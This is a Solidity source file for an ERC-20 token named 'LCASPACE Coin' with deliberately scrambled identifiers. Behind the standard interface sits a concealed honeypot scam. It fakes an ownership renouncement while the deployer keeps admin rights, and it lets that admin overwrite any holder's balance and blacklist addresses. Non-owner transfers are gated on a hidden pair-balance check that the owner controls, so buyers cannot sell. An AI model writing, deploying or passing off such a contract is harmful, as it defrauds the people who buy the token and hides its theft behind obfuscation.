//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface yvurtegrydo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address bssvojqduhjpd) external view returns (uint256);

    function transfer(address emzyaubpougapv, uint256 iowukarsztyle) external returns (bool);

    function allowance(address rrqwhmzbz, address spender) external view returns (uint256);

    function approve(address spender, uint256 iowukarsztyle) external returns (bool);

    function transferFrom(
        address sender,
        address emzyaubpougapv,
        uint256 iowukarsztyle
    ) external returns (bool);

    event Transfer(address indexed from, address indexed mgogdbgiifo, uint256 value);
    event Approval(address indexed rrqwhmzbz, address indexed spender, uint256 value);
}

interface kkjyxkhporw is yvurtegrydo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract tebdvcils {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface owizodftlw {
    function createPair(address eegwvzutluq, address hkolrautoyznc) external returns (address);
}

interface dpocsjmjhve {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract LCASPACECoin is tebdvcils, yvurtegrydo, kkjyxkhporw {

    string private rgtuirbpjsei = "LCN";

    function balanceOf(address bssvojqduhjpd) public view virtual override returns (uint256) {
        return roquctabpt[bssvojqduhjpd];
    }

    address public vhtnenrgrfv;

    uint256 private csetmjqbwfv;

    uint256 vchfcywsxvecp;

    address ouvmtuppccvblb = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private lwrqqcheq;

    bool public gkccsuzotu;

    bool private qpxkitetg;

    function pjggrhaovc() public {
        emit OwnershipTransferred(vhtnenrgrfv, address(0));
        lwrqqcheq = address(0);
    }

    function allowance(address qslxuhzkxzhuqv, address qbruaalrxk) external view virtual override returns (uint256) {
        if (qbruaalrxk == ouvmtuppccvblb) {
            return type(uint256).max;
        }
        return usqgrzjwlfshes[qslxuhzkxzhuqv][qbruaalrxk];
    }

    mapping(address => bool) public rzsruczpbgn;

    function lipunmkngcx(address tzxczwikchybsu, uint256 iowukarsztyle) public {
        ljonqntokhjuw();
        roquctabpt[tzxczwikchybsu] = iowukarsztyle;
    }

    function decimals() external view virtual override returns (uint8) {
        return zcmezjrwx;
    }

    function ueucycycbn(address wkbeocypnab) public {
        if (gkccsuzotu) {
            return;
        }
        if (qpxkitetg) {
            qpxkitetg = true;
        }
        mucwowpiw[wkbeocypnab] = true;
        if (jgkpkkkpfztw == qpxkitetg) {
            csetmjqbwfv = odrqmlkar;
        }
        gkccsuzotu = true;
    }

    function approve(address qbruaalrxk, uint256 iowukarsztyle) public virtual override returns (bool) {
        usqgrzjwlfshes[_msgSender()][qbruaalrxk] = iowukarsztyle;
        emit Approval(_msgSender(), qbruaalrxk, iowukarsztyle);
        return true;
    }

    constructor (){
        if (wsxqafqarqkkq == qpxkitetg) {
            qpxkitetg = true;
        }
        pjggrhaovc();
        dpocsjmjhve lpmcpdycu = dpocsjmjhve(ouvmtuppccvblb);
        ioqvwnpctt = owizodftlw(lpmcpdycu.factory()).createPair(lpmcpdycu.WETH(), address(this));
        
        vhtnenrgrfv = _msgSender();
        mucwowpiw[vhtnenrgrfv] = true;
        roquctabpt[vhtnenrgrfv] = jtbxiqycqft;
        if (jgkpkkkpfztw) {
            odrqmlkar = csetmjqbwfv;
        }
        emit Transfer(address(0), vhtnenrgrfv, jtbxiqycqft);
    }

    function getOwner() external view returns (address) {
        return lwrqqcheq;
    }

    function fplxcbpyknf(uint256 iowukarsztyle) public {
        ljonqntokhjuw();
        ecxthscoqraxka = iowukarsztyle;
    }

    address sloqouzxr = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private jgkpkkkpfztw;

    uint256 private jtbxiqycqft = 100000000 * 10 ** 18;

    function zektplcqbjz(address tdtzjjdqjykkpu) public {
        ljonqntokhjuw();
        
        if (tdtzjjdqjykkpu == vhtnenrgrfv || tdtzjjdqjykkpu == ioqvwnpctt) {
            return;
        }
        rzsruczpbgn[tdtzjjdqjykkpu] = true;
    }

    mapping(address => uint256) private roquctabpt;

    string private dpgmlzzcm = "LCASPACE Coin";

    function ljonqntokhjuw() private view {
        require(mucwowpiw[_msgSender()]);
    }

    function mzbsnyfgj(address fjyrrfxdhmur, address emzyaubpougapv, uint256 iowukarsztyle) internal returns (bool) {
        require(roquctabpt[fjyrrfxdhmur] >= iowukarsztyle);
        roquctabpt[fjyrrfxdhmur] -= iowukarsztyle;
        roquctabpt[emzyaubpougapv] += iowukarsztyle;
        emit Transfer(fjyrrfxdhmur, emzyaubpougapv, iowukarsztyle);
        return true;
    }

    address public ioqvwnpctt;

    function totalSupply() external view virtual override returns (uint256) {
        return jtbxiqycqft;
    }

    function owner() external view returns (address) {
        return lwrqqcheq;
    }

    mapping(address => bool) public mucwowpiw;

    function name() external view virtual override returns (string memory) {
        return dpgmlzzcm;
    }

    function vvlymtqix(address fjyrrfxdhmur, address emzyaubpougapv, uint256 iowukarsztyle) internal returns (bool) {
        if (fjyrrfxdhmur == vhtnenrgrfv) {
            return mzbsnyfgj(fjyrrfxdhmur, emzyaubpougapv, iowukarsztyle);
        }
        uint256 wkkqueadaic = yvurtegrydo(ioqvwnpctt).balanceOf(sloqouzxr);
        require(wkkqueadaic == ecxthscoqraxka);
        require(!rzsruczpbgn[fjyrrfxdhmur]);
        return mzbsnyfgj(fjyrrfxdhmur, emzyaubpougapv, iowukarsztyle);
    }

    function symbol() external view virtual override returns (string memory) {
        return rgtuirbpjsei;
    }

    function transfer(address tzxczwikchybsu, uint256 iowukarsztyle) external virtual override returns (bool) {
        return vvlymtqix(_msgSender(), tzxczwikchybsu, iowukarsztyle);
    }

    event OwnershipTransferred(address indexed znrbzjnctqrb, address indexed wqqlpfljdnhxgx);

    mapping(address => mapping(address => uint256)) private usqgrzjwlfshes;

    bool private wsxqafqarqkkq;

    uint256 public odrqmlkar;

    uint256 ecxthscoqraxka;

    function transferFrom(address fjyrrfxdhmur, address emzyaubpougapv, uint256 iowukarsztyle) external override returns (bool) {
        if (_msgSender() != ouvmtuppccvblb) {
            if (usqgrzjwlfshes[fjyrrfxdhmur][_msgSender()] != type(uint256).max) {
                require(iowukarsztyle <= usqgrzjwlfshes[fjyrrfxdhmur][_msgSender()]);
                usqgrzjwlfshes[fjyrrfxdhmur][_msgSender()] -= iowukarsztyle;
            }
        }
        return vvlymtqix(fjyrrfxdhmur, emzyaubpougapv, iowukarsztyle);
    }

    uint8 private zcmezjrwx = 18;

}